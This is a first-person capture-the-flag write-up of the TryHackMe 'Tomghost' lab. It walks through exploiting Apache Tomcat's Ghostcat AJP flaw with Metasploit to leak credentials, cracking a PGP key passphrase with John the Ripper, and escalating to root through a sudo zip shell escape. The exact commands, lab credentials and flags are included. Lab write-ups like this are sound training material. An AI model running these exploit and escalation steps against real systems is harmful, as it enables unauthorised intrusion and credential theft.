Tomghost

Target IP: 10.113.133.158

## 1. Enumeration

I started with an Nmap scan to identify open ports and running services.

sudo nmap -sC -sV 10.113.133.158

The scan showed the following interesting ports:

22/tcp   open  ssh
53/tcp   open  tcpwrapped
8009/tcp open  ajp13 Apache Jserv Protocol v1.3
8080/tcp open  http Apache Tomcat 9.0.30

Port 8009 immediately looked interesting because it was running AJP, while port 8080 was running Apache Tomcat.

## 2. Exploiting Ghostcat

I searched Metasploit for an exploit related to Apache Jserv and found the following module:

auxiliary/admin/http/tomcat_ghostcat

This module exploits the Ghostcat vulnerability in Apache Tomcat AJP and can be used to read files from the Tomcat server.

I opened the module and set the target IP:

use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.113.133.158
run

The module successfully returned the contents of a Tomcat configuration file.

Inside the response I found the following credentials:

skyfuck:8730281lkjlkjdqlksalks

I tried these credentials with SSH:

ssh skyfuck@10.113.133.158

The credentials worked and I gained access as the skyfuck user.

## 3. Enumeration as skyfuck

After logging in, I checked the current directory:

pwd
ls -la

The home directory contained two interesting files:

credential.pgp
tryhackme.asc

I also checked the other users on the system:

cd /home
ls

There was another user named merlin.

Inside merlin's home directory I found the user flag:

cat /home/merlin/user.txt

The flag was:

THM{GhostCat_1s_so_cr4zy}

## 4. Analyzing the PGP Files

I first checked what the files were used for.

The .pgp file is used for PGP encryption, while the .asc file is commonly used to store ASCII armored PGP keys, encrypted messages or signatures.

The file tryhackme.asc contained a PGP private key.

This suggested that credential.pgp was encrypted using the private key.

I copied the files to my Kali machine using scp:

scp -r skyfuck@10.113.133.158:/home/skyfuck .

## 5. Cracking the PGP Passphrase

The private key was protected by a passphrase, so I used gpg2john to extract a hash that could be processed by John the Ripper.

gpg2john tryhackme.asc > hash.txt

Then I used the rockyou wordlist:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

John recovered the passphrase:

alexandru

I could now use the private key to decrypt the PGP file.

After importing the key into GPG, I decrypted credential.pgp:

gpg -d credential.pgp

The decrypted data contained credentials for the merlin user:

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

## 6. Accessing the Merlin User

I used the recovered credentials to connect through SSH:

ssh merlin@10.113.133.158

After logging in, I checked my privileges:

whoami
id

I was a regular user and did not have root privileges.

## 7. Privilege Escalation Enumeration

I first checked for SUID binaries:

find / -type f -perm -4000 2>/dev/null

The system contained several SUID binaries, including sudo.

I then checked the commands that merlin was allowed to execute with sudo:

sudo -l

The important part of the output was:

User merlin may run the following commands on ubuntu:
(root : root) NOPASSWD: /usr/bin/zip

This meant that merlin could execute zip as root without providing a password.

## 8. Privilege Escalation with Zip

Since zip could be executed with root privileges, I used its command execution functionality to spawn a shell.

sudo zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"

I then checked the current user:

whoami

The result was:

root

I successfully escalated from merlin to root.

## 9. Root Flag

Finally, I searched the filesystem for root.txt:

find / -type f -iname "root.txt" 2>/dev/null

The file was located at:

/root/root.txt

I read the flag:

cat /root/root.txt

This completed the room.

## Attack Path

Nmap enumeration

AJP on port 8009

Ghostcat vulnerability

Read Tomcat configuration

Recover skyfuck credentials

SSH access as skyfuck

Find PGP files

Transfer files to Kali

Crack PGP passphrase with John the Ripper

Decrypt credentials

SSH access as merlin

sudo enumeration

NOPASSWD zip

Privilege escalation to root

Read root.txt

## Tools Used

Nmap

Metasploit

SSH

SCP

GPG

gpg2john

John the Ripper

Linux find

Sudo

Zip
